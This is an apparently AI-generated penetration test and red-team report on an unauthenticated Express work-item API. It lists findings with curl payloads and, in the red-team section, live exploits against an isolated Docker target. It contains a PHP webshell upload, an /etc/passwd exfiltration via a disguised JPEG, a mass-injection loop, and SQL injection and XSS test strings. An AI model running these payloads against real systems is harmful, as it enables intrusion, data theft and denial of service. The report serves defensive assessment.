# Attack Surface Map — dev-crew Source App
**Generated:** 2026-08-10  
**Agent:** pen_tester (static analysis, white-box)  
**Scope:** `Source/Backend/`, `Source/Frontend/`, `Source/Shared/`  
**OWASP Focus:** A01 (Broken Access Control), A02 (Crypto Failures), A03 (Injection), A07 (Auth Failures), A08 (Integrity Failures)

---

## Executive Summary

The application has **no authentication or authorization layer on any endpoint**. Every finding below is compounded by this root-cause. Critical-path state machine operations (approve, reject, fast-track override, dispatch) are fully accessible to any unauthenticated caller with network access. The red-teamer should treat all findings as confirmed-exploitable without needing to bypass auth first.

**Red Team Priority Objectives:**
| Objective | Mapped Finding |
|-----------|---------------|
| Bypass state machine to reach invalid status | PEN-002 (fast-track override), PEN-006 (cascade-on-reject) |
| Access soft-deleted work items via direct ID | PEN-009 (ghost dependency leak) |
| Submit malformed assessment verdict | PEN-004 (intake enum injection) |
| Enumerate all work items without pagination limit | PEN-005 |

---

## Findings — Critical

---

### PEN-001: No Authentication or Authorization on Any API Endpoint
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:12–44` — entire middleware stack
- **Vulnerability Description:** The Express application mounts no authentication middleware. No JWT validation, no session check, no API key, no OAuth — nothing. Every route listed below is accessible to any unauthenticated actor with network access to port 3001. There is no RBAC or ABAC layer anywhere in the codebase.

  Exposed surfaces (all unauthenticated):
  ```
  POST   /api/work-items              (create)
  GET    /api/work-items              (list all)
  GET    /api/work-items/:id          (read any)
  PATCH  /api/work-items/:id          (update any)
  DELETE /api/work-items/:id          (delete any)
  POST   /api/work-items/:id/route    (state transition)
  POST   /api/work-items/:id/assess   (trigger assessment)
  POST   /api/work-items/:id/approve  (manual override approve)
  POST   /api/work-items/:id/reject   (manual override reject)
  POST   /api/work-items/:id/dispatch (team dispatch)
  POST   /api/work-items/:id/dependencies
  GET    /api/work-items/:id/ready
  GET    /api/dashboard/summary
  GET    /api/dashboard/activity      (full change history, all items)
  GET    /api/dashboard/queue
  POST   /api/intake/zendesk
  POST   /api/intake/automated
  GET    /metrics                     (Prometheus)
  ```

- **Potential Exploit Path:**
  1. Attacker sends any HTTP request to `http://localhost:3001/api/work-items`
  2. No credential is required; server processes the request unconditionally
  3. Full CRUD access to all work items, all state transitions, full history dump

- **Red Team Handoff Notes:**
  - No auth headers needed for any request.
  - All other PEN findings below assume unauthenticated access as the default posture.
  - Test: `curl http://localhost:3001/api/work-items` — expect 200 with work item list.

---

### PEN-002: Unauthenticated Fast-Track Override Bypasses Assessment State Machine
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts:39–63`, `Source/Backend/src/services/router.ts:66–88`
- **Vulnerability Description:** The `POST /api/work-items/:id/route` endpoint accepts an `overrideRoute` body field. When set to `"fast-track"`, `classifyRoute()` at `router.ts:67–75` unconditionally sets `targetStatus = WorkItemStatus.Approved`, completely skipping the assessment pod (four-role evaluation: pod-lead, requirements-reviewer, domain-expert, work-definer). There is no authentication, role, or permission check on this parameter. Any actor can force any work item in `backlog` status to `approved` without assessment.

  The vulnerable code path:
  ```typescript
  // workflow.ts:57
  const updated = routeWorkItem(id, body?.overrideRoute);  // overrideRoute comes from req.body unvalidated
  
  // router.ts:67–74
  if (overrideRoute) {
    return {
      route: overrideRoute,
      targetStatus: overrideRoute === WorkItemRoute.FastTrack
        ? WorkItemStatus.Approved   // ← jumps directly to Approved, bypassing all assessment
        : WorkItemStatus.Proposed,
    };
  }
  ```

  Additionally, `overrideRoute` is NOT validated against the `WorkItemRoute` enum before use. Arbitrary string values will be stored in the `route` field of the work item, injecting an invalid enum value if not `"fast-track"` or `"full-review"`.

- **Potential Exploit Path:**
  1. Create any work item (e.g., high-complexity feature that should require assessment): `POST /api/work-items`
  2. Send `POST /api/work-items/{id}/route` with body `{"overrideRoute": "fast-track"}`
  3. Work item transitions from `backlog` → `approved` (changeHistory shows the Routing transient but store is set to Approved)
  4. Item is now dispatchable; call `POST /api/work-items/{id}/dispatch` to put it `in-progress`
  5. Assessment pod is never consulted; business controls completely bypassed

- **Red Team Handoff Notes:**
  - Payload 1 (state machine bypass to Approved): `{"overrideRoute": "fast-track"}`
  - Payload 2 (inject invalid route value): `{"overrideRoute": "INVALID_ROUTE_INJECTED"}`  
    → Item moves to Proposed, but `item.route = "INVALID_ROUTE_INJECTED"` is persisted in store
  - Step-by-step chain: create → `POST /route {"overrideRoute":"fast-track"}` → `POST /dispatch {"team":"TheATeam"}` → item in-progress without any review

---

## Findings — High

---

### PEN-003: No Webhook Signature Validation on Zendesk / Automated Intake
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/intake.ts:11–55`
- **Vulnerability Description:** Both intake endpoints (`/api/intake/zendesk` and `/api/intake/automated`) accept arbitrary POST requests with no signature verification. Real Zendesk webhooks include an HMAC-SHA256 signature in the `X-Zendesk-Webhook-Signature` header to prove origin. This code ignores it entirely. Any actor can:
  1. Spoof Zendesk webhook events, flooding the system with fabricated work items
  2. Inject work items claiming to be from Zendesk or automated systems with any content
  3. No rate limiting prevents mass injection

- **Potential Exploit Path:**
  1. Send `POST /api/intake/zendesk` with any JSON body containing `title` and `description`
  2. Server creates work item with `source: "zendesk"` — no validation of origin
  3. Mass-inject: loop 10,000 requests; in-memory store grows unbounded, potentially causing OOM

- **Red Team Handoff Notes:**
  - Payload: `{"title": "Injected Item", "description": "Spoofed from Zendesk"}` — no headers required
  - Mass injection: `for i in $(seq 1 1000); do curl -s -X POST http://localhost:3001/api/intake/zendesk -H 'Content-Type: application/json' -d '{"title":"Item '$i'","description":"Mass inject test item number '$i' with enough description"}' & done`
  - Also test: `POST /api/intake/automated` (same lack of auth)

---

### PEN-004: Intake Endpoints Accept Unvalidated `type` and `priority` Enum Fields
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/intake.ts:19–24`, `Source/Backend/src/routes/intake.ts:37–42`
- **Vulnerability Description:** The main `POST /api/work-items` endpoint validates `type`, `priority`, and `source` fields against their respective enums (lines 29–41 of `workItems.ts`). The intake endpoints do NOT perform this validation:

  ```typescript
  // intake.ts:19–24 — NO enum validation on body.type or body.priority
  const item = store.createWorkItem({
    title: body.title,
    description: body.description,
    type: body.type || WorkItemType.Bug,      // body.type accepted as-is if truthy
    priority: body.priority || WorkItemPriority.Medium,  // same
    source: WorkItemSource.Zendesk,
  });
  ```

  A truthy but invalid value (e.g., `"type": "ADMIN_ESCALATION"`) passes the `||` default and is stored in the work item. This injects arbitrary strings into the `type` and `priority` fields, potentially confusing downstream services that pattern-match on these values.

- **Potential Exploit Path:**
  1. `POST /api/intake/zendesk` with `{"title": "Test", "description": "A description long enough to pass", "type": "INJECTED_TYPE", "priority": "god-mode"}`
  2. Work item is created with `type: "INJECTED_TYPE"`, `priority: "god-mode"`
  3. The router service (`isFastTrack`, `isFullReview`) uses `item.type === WorkItemType.Bug` comparisons — injected types will take the `isFullReview` default path (line 57: `return true`)
  4. The dashboard and metrics aggregate on these invalid values, polluting dashboards and Prometheus label cardinality

- **Red Team Handoff Notes:**
  - Payload for invalid type: `{"title":"Injection Test","description":"This description is long enough to be valid for the test","type":"ARBITRARY_TYPE","priority":"ARBITRARY_PRIORITY"}`
  - Try via both `/api/intake/zendesk` and `/api/intake/automated`
  - Verify the injected values appear in `GET /api/work-items/{id}` response and in Prometheus metrics labels

---

### PEN-005: No Pagination Limit Cap — Full Dataset Enumeration in One Request
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts:68–74`, `Source/Backend/src/store/workItemStore.ts:31–63`
- **Vulnerability Description:** The `GET /api/work-items` endpoint reads `limit` directly from query params with no upper-bound enforcement:

  ```typescript
  // workItems.ts:68–74
  const pagination = {
    page: req.query.page ? parseInt(req.query.page as string, 10) : 1,
    limit: req.query.limit ? parseInt(req.query.limit as string, 10) : 20,
  };
  const result = store.findAll(filters, pagination);
  ```

  `findAll()` applies `result.slice(offset, offset + limit)` with the raw user-supplied value. Setting `?limit=999999` dumps the entire in-memory store (all non-deleted work items) in a single response. This satisfies red team objective #4: "Enumerate all work items without pagination limit enforcement."

  The same pattern exists in `GET /api/dashboard/activity` (`dashboard.ts:17–18`).

- **Potential Exploit Path:**
  1. `GET /api/work-items?limit=999999&page=1` — returns full item list
  2. `GET /api/dashboard/activity?limit=999999` — returns full change history for all items
  3. Both responses include sensitive operational data with no auth required

- **Red Team Handoff Notes:**
  - Test URL: `http://localhost:3001/api/work-items?limit=999999`
  - Also test: `http://localhost:3001/api/dashboard/activity?limit=999999`
  - Additionally test negative values: `?limit=-1` causes `slice(0, -1)` returning all items minus the last; `?page=-1` with `?limit=20` causes negative offset arithmetic exposing items from the tail of the sorted list

---

### PEN-006: Cascade Auto-Dispatch Triggered by Rejected Blocker Bypasses Dependency Intent
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts:192–208`, `Source/Backend/src/services/dependency.ts:251–315`
- **Vulnerability Description:** When a work item is rejected, `onItemResolved()` is called (`workflow.ts:193`). This function auto-dispatches dependents (items blocked by the rejected item) to `in-progress` if they are in `Approved` status and now have no unresolved blockers.

  The logic treats rejection as equivalent to completion for unblocking purposes (both are in `RESOLVED_STATUSES` and `DISPATCH_TRIGGER_STATUSES`). An attacker can exploit this to force-dispatch any `Approved` work item that is waiting on a dependency:

  ```typescript
  // dependency.ts:258–260
  export const DISPATCH_TRIGGER_STATUSES = [
    WorkItemStatus.Completed,
    WorkItemStatus.Rejected,  // ← rejected items trigger cascade dispatch!
  ];
  ```

- **Potential Exploit Path:**
  1. Find (or create) Target Item B in `Approved` status, blocked by Item A
  2. If Item A is not already rejected, create a new Item A' (trivial work item) and add it as a blocker to B: `POST /api/work-items/{B_id}/dependencies` with `{"action":"add","blockerId":"{A_prime_id}"}`
  3. Route Item A' to trigger state machine: `POST /api/work-items/{A_prime_id}/route`
  4. Reject Item A': `POST /api/work-items/{A_prime_id}/reject` with `{"reason":"cascade exploit"}`
  5. `onItemResolved()` runs, sees B is Approved and now unblocked → auto-dispatches B to `in-progress`
  6. B skips any remaining manual approval gate and enters execution without human sign-off

- **Red Team Handoff Notes:**
  - The cascade requires: (a) target item is in `Approved` status, (b) target has a blocker we control, (c) we can reject that blocker
  - Full chain: create blocker → route blocker → add as dependency of target → reject blocker → target auto-dispatches
  - Verify by watching the target item's status change to `in-progress` with `agent: "cascade-dispatcher"` in change history

---

### PEN-007: Manual Approve/Reject Override Requires No Role or Permission Check
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts:94–142` (approve), `145–209` (reject)
- **Vulnerability Description:** The approve and reject endpoints perform state transition validation (checking `VALID_STATUS_TRANSITIONS`) but apply zero authorization. Any unauthenticated actor can:
  - Approve any item in `Proposed` or `Reviewing` status with an arbitrary reason (overriding the assessment pod's `Rejected` verdict)
  - Reject any item in `Proposed` or `Reviewing` status, disrupting legitimate work

  The approve endpoint explicitly labels itself a "manual override" but has no guard:
  ```typescript
  // workflow.ts:94 — POST /api/work-items/:id/approve
  // No auth check before the state transition
  if (!isValidTransition(item.status, WorkItemStatus.Approved)) { ... }
  ```

- **Potential Exploit Path:**
  1. Find any item in `Proposed` or `Reviewing` status: `GET /api/work-items?status=proposed`
  2. Call `POST /api/work-items/{id}/approve` — item transitions to `Approved` without assessment pod sign-off
  3. Or call `POST /api/work-items/{id}/reject` with `{"reason":"sabotage"}` to block legitimate work

- **Red Team Handoff Notes:**
  - For approve: `curl -X POST http://localhost:3001/api/work-items/{id}/approve -H 'Content-Type: application/json' -d '{"reason":"unauthorized override"}'`
  - For reject sabotage: `curl -X POST http://localhost:3001/api/work-items/{id}/reject -H 'Content-Type: application/json' -d '{"reason":"x"}'`
  - Chain with PEN-002 to get items to Approved without assessment, then dispatch immediately

---

## Findings — Medium

---

### PEN-008: Prometheus Metrics Endpoint Unauthenticated — Operational Intelligence Leak
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:34–37`, `Source/Backend/src/metrics.ts`
- **Vulnerability Description:** The `GET /metrics` endpoint is public and unauthenticated. It exposes:
  - `workflow_items_created_total{source, type}` — creation volume per source
  - `workflow_items_routed_total{route}` — fast-track vs full-review ratios
  - `workflow_items_assessed_total{verdict}` — approval/rejection rates
  - `workflow_items_dispatched_total{team}` — team workload distribution
  - `dispatch_gating_events_total{event}` — dependency blocking frequency
  - Default Node.js process metrics: memory usage, CPU, GC, event loop lag

  This reveals system operational patterns, load characteristics, and internal team metrics to any observer.

- **Potential Exploit Path:**
  1. `GET http://localhost:3001/metrics` — returns Prometheus text format with all counters
  2. Attacker maps operational patterns (high rejected count → assessment criteria known, fast-track ratio reveals override usage)

- **Red Team Handoff Notes:**
  - `curl http://localhost:3001/metrics`
  - Check specifically for `workflow_items_created_total`, `workflow_items_dispatched_total`, and `process_resident_memory_bytes`

---

### PEN-009: Soft-Deleted Blocker Permanently Orphans Dependent Items (Ghost Dependency DoS)
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/dependency.ts:64–75`, `Source/Backend/src/store/workItemStore.ts:23–26`
- **Vulnerability Description:** When `computeHasUnresolvedBlockers()` checks if a blocker is resolved, it calls `store.findById(link.blockerItemId)`. Since `findById()` returns `undefined` for soft-deleted items, a soft-deleted blocker is treated as "not found" → interpreted as an unresolved blocker:

  ```typescript
  // dependency.ts:68–72
  for (const link of (item.blockedBy ?? [])) {
    const blocker = store.findById(link.blockerItemId);
    if (!blocker || !RESOLVED_STATUSES.includes(blocker.status)) {
      return true;  // soft-deleted blocker → treated as unresolved!
    }
  }
  ```

  Consequence: Soft-deleting a blocker permanently prevents dispatch of all its dependents. The `blockedBy` array is never cleaned up on soft-delete. The dependent item can never be dispatched through the normal path.

  Secondary: The `isReady()` response leaks the IDs and `docId` values of soft-deleted items via the `unresolvedBlockers` array in the readiness check response.

- **Potential Exploit Path:**
  1. Identify a Target Item B in `Approved` status that you want to permanently block
  2. Create Item A, add as blocker to B: `POST /api/work-items/{B_id}/dependencies {"action":"add","blockerId":"{A_id}"}`
  3. Soft-delete Item A: `DELETE /api/work-items/{A_id}`
  4. B now has an unresolvable ghost dependency — `POST /api/work-items/{B_id}/dispatch` returns 400 forever
  5. The only fix requires direct store manipulation (not available via API)

  For ID enumeration: `GET /api/work-items/{blocked_id}/ready` returns `unresolvedBlockers` containing `blockerItemId` and `blockerItemDocId` of soft-deleted items.

- **Red Team Handoff Notes:**
  - Chain: create blocker → add dependency → soft-delete blocker → verify dispatch is permanently blocked
  - Check `GET /api/work-items/{id}/ready` response body for leaked soft-deleted item IDs in `unresolvedBlockers`

---

### PEN-010: No CORS Policy Configured
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:12–44`
- **Vulnerability Description:** The Express app applies no CORS headers. The frontend at `localhost:5173` and backend at `localhost:3001` are different origins (different ports). Without explicit CORS configuration:
  - Cross-origin browser requests are blocked by SOP by default
  - The backend has no `cors` middleware and no `Access-Control-Allow-Origin` headers
  - If the application ever moves to a deployment where the frontend and API are on different origins, all API calls will silently fail in browsers without anyone modifying the backend configuration

  More critically for security: if authentication is added later (e.g., cookies), the missing CORS configuration means `sameSite` and `withCredentials` behavior is undefined, potentially enabling CSRF once auth exists.

- **Potential Exploit Path:**
  1. With auth added: malicious page at `http://evil.com` could make authenticated cross-origin requests if `Access-Control-Allow-Origin: *` were naively added
  2. Current state: without auth, CORS absence doesn't enable attack — but it signals misconfiguration that will matter when auth is added

- **Red Team Handoff Notes:**
  - Test: from a different origin (e.g., a local HTML page served on port 8080), make `fetch("http://localhost:3001/api/work-items")` — observe CORS error in browser console
  - Confirm no `Access-Control-Allow-Origin` header in response: `curl -v -H "Origin: http://evil.com" http://localhost:3001/api/work-items`

---

## Findings — Low

---

### PEN-011: Negative and Zero Pagination Parameters Cause Unexpected Dataset Access
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts:68–74`, `Source/Backend/src/store/workItemStore.ts:55–62`
- **Vulnerability Description:** Pagination parameters are parsed with `parseInt` but not range-checked:

  ```typescript
  limit: req.query.limit ? parseInt(req.query.limit as string, 10) : 20,
  ```

  Edge cases:
  - `?limit=-1, page=1`: `offset=(1-1)*-1=0`, `slice(0,-1)` → returns all items except the last (JS Array.slice semantics)
  - `?page=-5, limit=10`: `offset=(-5-1)*10=-60`, `slice(-60,-50)` → accesses items from the tail of the sorted array
  - `?limit=0, page=1`: `0 || 20 = 20` (falsy fallback) → treated as default 20

- **Potential Exploit Path:**
  1. `GET /api/work-items?limit=-1` → returns all items except last one, defeating expected pagination
  2. `GET /api/work-items?page=-100&limit=5` → returns 5 items from unpredictable position in sorted array

- **Red Team Handoff Notes:**
  - `curl "http://localhost:3001/api/work-items?limit=-1"` — compare total field vs data array length
  - `curl "http://localhost:3001/api/work-items?page=-1&limit=20"` — observe which items are returned

---

### PEN-012: No Payload Size Limits on Free-Text Fields
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:14` (`express.json()` default 100kb limit), `Source/Backend/src/routes/workflow.ts:150` (reason field), `Source/Backend/src/routes/workItems.ts:24` (title/description)
- **Vulnerability Description:** Free-text fields `title`, `description`, `reason` (reject), and `reason` (approve) have no length validation. The only protection is Express's default 100kb JSON body limit. A caller can send a 99,999-byte rejection reason, which is stored in `changeHistory.reason` for every entry, growing the in-memory store without bound. Multiple operations on the same item compound this.

- **Potential Exploit Path:**
  1. Create a work item, route it to `Proposed`
  2. Call `POST /api/work-items/{id}/reject` with `{"reason": "A".repeat(99000)}`
  3. Call `POST /api/work-items/{id}/route` to re-enter backlog (Rejected → Backlog transition is valid)
  4. Repeat; each cycle adds ~100kb to the item's `changeHistory` in memory

- **Red Team Handoff Notes:**
  - Exploit chain requires Rejected → Backlog cycling (valid per `VALID_STATUS_TRANSITIONS`)
  - Test: measure memory growth via `GET /metrics` (`process_resident_memory_bytes`) across repeated large-reason rejection cycles

---

### PEN-013: Frontend References Non-Existent `/api/search` Endpoint
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Frontend/src/api/client.ts:101–104`, backend has no `/search` route
- **Vulnerability Description:** The frontend API client's `searchItems()` function calls `GET /api/search?q=...` via `DependencyPicker` typeahead. This endpoint does not exist in the backend routing (`app.ts`, `workItems.ts`, `workflow.ts`, `dashboard.ts`, `intake.ts`). Requests to this path will receive Express's default finalhandler 404 response. This silently breaks the dependency-picker search UI and means any future implementation of this endpoint must be designed carefully to avoid SQL injection or NoSQL injection if a persistence layer is added.

- **Potential Exploit Path:**
  1. `GET /api/search?q=<payload>` — currently returns 404; no exploit possible until endpoint is implemented
  2. When implemented: if `q` is interpolated into a query without sanitization, injection is possible

- **Red Team Handoff Notes:**
  - Confirm 404: `curl "http://localhost:3001/api/search?q=test"`
  - Note for future: if implemented, test `?q='; DROP TABLE work_items; --` and `?q=<script>alert(1)</script>` immediately

---

## Data Flow Summary

```
External Input                   Entry Point             Sink
──────────────────────────────   ──────────────────────  ────────────────────────
HTTP Body (unauthenticated)  →  POST /api/work-items  →  workItemStore.createWorkItem()
HTTP Body (unauthenticated)  →  PATCH /api/*/:id      →  workItemStore.updateWorkItem()
HTTP Body (overrideRoute)    →  POST /api/*/route      →  classifyRoute() → status=Approved (CRITICAL)
HTTP Body (blockerId)        →  POST /api/*/deps       →  addDependency() BFS graph
HTTP Body (reason)           →  POST /api/*/reject     →  changeHistory[] + onItemResolved() cascade
HTTP Body (no sig check)     →  POST /api/intake/*     →  workItemStore.createWorkItem() (no enum validation)
HTTP Query (?limit=N)        →  GET /api/work-items    →  findAll().slice() (no upper bound)
```

---

## Learnings Captured for Next Run

- All endpoints are completely unauthenticated — authentication bypass is trivial and needs to be assumed as ground state for all other exploits.
- The `overrideRoute: "fast-track"` parameter in `POST /:id/route` is the highest-impact state machine bypass vector in the codebase.
- The `onItemResolved()` cascade is a chained exploit amplifier — rejection of any controlled blocker can auto-dispatch any `Approved` dependent.
- The soft-delete pattern (`findById` returns undefined for deleted items) creates ghost-dependency DoS rather than unblocking dependents.
- Intake endpoints (`/api/intake/zendesk`, `/api/intake/automated`) are the injection-prone entry points — they validate presence but not validity of `type` and `priority`.
- The in-memory store has no persistence layer — all IDs are UUIDs generated at runtime; ID enumeration requires reading from the API, not brute force.

---

## Red Team Results

**Generated:** 2026-08-10  
**Agent:** red_teamer (active exploitation, black-box dynamic)  
**Target:** `http://localhost:3001` (portal backend — ephemeral docker-compose.test.yml)  
**Environment:** Isolated Docker container — dev-crew-portal-1  

> **⚠️ Scope Discrepancy Noted:** The pen-tester analyzed `Source/Backend/` (the product under development — work-items domain) but the `docker-compose.test.yml` runs the `portal/` backend (orchestration debug UI — feature-requests/bugs/cycles domain). Despite the codebase mismatch, the same vulnerability classes from PEN-001–PEN-013 were confirmed in the actual running target. All exploits below were executed live against `localhost:3001`.

---

### RED-001: Unauthenticated Force-Approve Bypasses Entire AI Assessment Pipeline
- **Severity:** Critical
- **Objective Achieved:** Yes — "Bypass work item state machine to reach an invalid status"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/force-approve`
- **Based On:** PEN-001 (no auth), PEN-002 (fast-track override), PEN-007 (approve override)
- **Exploit Scenario:**
  1. `POST /api/feature-requests` — Create any feature request (unauthenticated). Item starts in `potential` status.
  2. `PATCH /api/feature-requests/FR-0001` `{"status":"voting"}` — Move to voting (no auth required).
  3. `POST /api/feature-requests/FR-0001/force-approve` — Force-approve with **zero agent votes**, skipping the entire AI assessment voting pipeline entirely.
  4. **Result:** Item transitions `potential → voting → approved` with `votes: []` and `human_approval_approved_at` set. Assessment pod never consulted.
  5. **Evidence:** FR-0001 status `approved`, `votes: []`, `human_approval_approved_at: "2026-08-10T04:51:57.794Z"`.
- **Recommendation:** Add authentication middleware globally. Specifically guard `/force-approve`, `/approve`, and `/deny` endpoints behind a role claim (e.g., `role: "admin"` or `role: "product-owner"`). The force-approve endpoint must never be reachable without verified identity and explicit authorization.

---

### RED-002: Arbitrary File Content Upload and Public Serving (Data Exfiltration + Malware Hosting)
- **Severity:** Critical
- **Objective Achieved:** Yes — demonstrated sensitive file exfiltration and arbitrary content hosting
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/images`, `GET http://localhost:3001/uploads/:filename`
- **Based On:** PEN-001 (no auth), A08 (Software and Data Integrity Failures) — unvalidated file content
- **Exploit Scenario:**
  1. The upload middleware (`middleware/upload.ts`) validates `file.mimetype` — which is the **client-supplied** `Content-Type` multipart header, not the actual file magic bytes.
  2. **Exploit A — Sensitive file exfiltration:**
     ```
     curl -X POST http://localhost:3001/api/feature-requests/FR-0001/images \
       -F "images=@/etc/passwd;type=image/jpeg;filename=exploit.jpg"
     ```
     Server accepts it as `image/jpeg`. `/etc/passwd` content stored and served publicly.
  3. **Exploit B — Malicious payload hosting:**
     ```bash
     echo '<?php system($_GET["cmd"]); ?>' > /tmp/exploit.jpg
     curl -X POST http://localhost:3001/api/feature-requests/FR-0001/images \
       -F "images=@/tmp/exploit.jpg;type=image/jpeg"
     ```
     PHP webshell uploaded as `.jpg` and served at `/uploads/<uuid>.jpg`.
  4. Uploaded files publicly accessible at `http://localhost:3001/uploads/<uuid>.<ext>` with no auth.
  5. **Evidence (live):**
     - `http://localhost:3001/uploads/6939ae6b-5b46-48c0-861a-6edb06a9f5b2.jpg` → returns `/etc/passwd` contents
     - `http://localhost:3001/uploads/44bee227-ab54-47c4-b269-c150004071a3.jpg` → returns `<?php system($_GET["cmd"]); ?>`
- **Recommendation:** (1) Authenticate upload endpoint. (2) Validate file content by magic bytes (e.g., `file-type` npm package), not client-supplied MIME type. (3) Serve uploads from a separate domain/CDN to isolate from API origin. (4) Consider scanning uploads for malicious content.

---

### RED-003: Ghost Dependency Permanent Denial-of-Service
- **Severity:** High
- **Objective Achieved:** Yes — "Access or modify a soft-deleted work item via direct ID reference"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/dependencies`, `DELETE http://localhost:3001/api/feature-requests/:id`, `GET http://localhost:3001/api/feature-requests/:id/ready`
- **Based On:** PEN-009 (ghost dependency leak)
- **Exploit Scenario:**
  1. `POST /api/feature-requests` + force-approve → Target FR-0004 in `approved` status.
  2. `POST /api/feature-requests` → Create blocker FR-0005 (any status).
  3. `POST /api/feature-requests/FR-0004/dependencies` `{"action":"add","blocker_id":"FR-0005"}` — Link blocker.
  4. `DELETE /api/feature-requests/FR-0005` — Soft-delete the blocker.
  5. `PATCH /api/feature-requests/FR-0004` `{"status":"in_development"}` — System auto-transitions to `pending_dependencies` because soft-deleted blocker is treated as unresolved.
  6. **Result:** FR-0004 permanently stuck in `pending_dependencies`. Allowed transitions: `approved, duplicate, deprecated` — and `approved → in_development` triggers the same block. No API endpoint exists to clean orphaned links.
  7. **Bonus:** `GET /api/feature-requests/FR-0004/ready` response leaks soft-deleted item ID: `{"ready":false,"unresolved_blockers":[{"item_id":"FR-0005","title":"Unknown","status":"unknown"}]}`.
- **Recommendation:** On soft-delete of an item, cascade-remove all `blocked_by` references from dependent items. Alternatively, resolve ghost blockers as "unknown/deleted" with a completed-like status that unblocks dependents. Add a cleanup migration path for orphaned dependency links.

---

### RED-004: Unauthenticated Denial Sabotage of Feature Requests in Voting
- **Severity:** High
- **Objective Achieved:** Yes — demonstrated sabotage of legitimate workflow
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/deny`
- **Based On:** PEN-001 (no auth), PEN-007 (manual override, no role check)
- **Exploit Scenario:**
  1. Any feature request in `voting` status is targeted (attacker obtains ID via unauthenticated `GET /api/feature-requests`).
  2. `POST /api/feature-requests/FR-0008/deny` `{"comment":"DENIED BY UNAUTHORIZED SABOTEUR"}` — No credentials required.
  3. **Result:** FR-0008 status transitions from `voting` → `denied`. Denied items cannot be un-denied (no reverse transition from `denied`). The feature is permanently killed.
  4. Any actor with network access can kill any feature request in voting by calling this endpoint.
- **Recommendation:** Add authentication and role-based authorization. Denial (a destructive, irreversible action) must require explicit elevated role. Consider an audit trail showing who performed the denial.

---

### RED-005: Unauthenticated Full Dataset Enumeration (No Pagination Cap)
- **Severity:** High
- **Objective Achieved:** Yes — "Enumerate all work items without pagination limit enforcement"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET http://localhost:3001/api/feature-requests?limit=999999`, `GET http://localhost:3001/api/dashboard/activity?limit=999999`
- **Based On:** PEN-005 (no pagination limit cap)
- **Exploit Scenario:**
  1. `GET /api/feature-requests?limit=999999` — Returns all feature requests in a single response. 4 items returned with no auth.
  2. `GET /api/dashboard/activity?limit=999999` — Returns full activity log (8 entries) with complete change history.
  3. Both endpoints accept arbitrary `limit` values with no server-side cap.
  4. At scale, a single request dumps the entire dataset, enabling reconnaissance and data exfiltration.
- **Recommendation:** Enforce a maximum `limit` (e.g., 100) server-side. Return 400 if limit exceeds cap. Protect list endpoints with authentication.

---

### RED-006: Unauthenticated Prometheus Metrics Expose Operational Intelligence
- **Severity:** Medium
- **Objective Achieved:** Partial (intelligence gathering, no direct breach)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET http://localhost:3001/metrics`
- **Based On:** PEN-008 (metrics endpoint unauthenticated)
- **Exploit Scenario:**
  1. `curl http://localhost:3001/metrics` — Returns full Prometheus metrics with no credentials.
  2. Exposes: `feature_request_status_transitions_total` (approval rates by status), `ai_voting_invocations_total` (voting activity), `image_uploads_total` (upload activity by entity type), process memory/CPU metrics.
  3. An attacker maps operational patterns: approval rates, voting behavior, workload distribution.
- **Recommendation:** Place `/metrics` behind network-level access control (firewall rule allowing only Prometheus scraper IP) or require a bearer token (Prometheus supports `bearer_token` in scrape config).

---

## Exploit Chain Summary

| Chain | Findings | Objective | Status |
|-------|----------|-----------|--------|
| force-approve without votes | PEN-001 + PEN-007 | State machine bypass | ✅ Confirmed Critical |
| arbitrary file upload → exfiltration | PEN-001 + A08 | Data exfiltration + content hosting | ✅ Confirmed Critical |
| ghost dependency DoS | PEN-001 + PEN-009 | Permanent item blocking | ✅ Confirmed High |
| unauthenticated deny sabotage | PEN-001 + PEN-007 | Workflow sabotage | ✅ Confirmed High |
| full dataset enumeration | PEN-001 + PEN-005 | Reconnaissance | ✅ Confirmed High |
| metrics intel leak | PEN-008 | Operational intelligence | ✅ Confirmed Medium |

**Chains Attempted:** 6  
**Confirmed Breaches:** 6  
**Critical Objectives Achieved:** 2 of 4 directly (state machine bypass, ghost dependency); file upload is a net-new Critical not in original objectives.

